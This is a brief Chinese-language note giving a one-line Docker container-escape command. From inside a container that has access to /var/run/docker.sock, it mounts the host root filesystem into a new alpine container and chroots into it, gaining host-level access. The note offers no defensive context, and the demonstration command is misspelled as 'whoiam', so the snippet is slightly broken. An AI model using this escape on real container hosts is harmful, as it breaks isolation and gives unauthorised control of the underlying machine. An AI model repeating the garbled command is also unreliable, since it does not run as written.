在拥有/var/run/docker.sock访问权限以及安装了docker的docker容器内部执行以下命令
```
docker run --rm -v /:/host -it alpine chroot /host sh -c "whoiam"
```
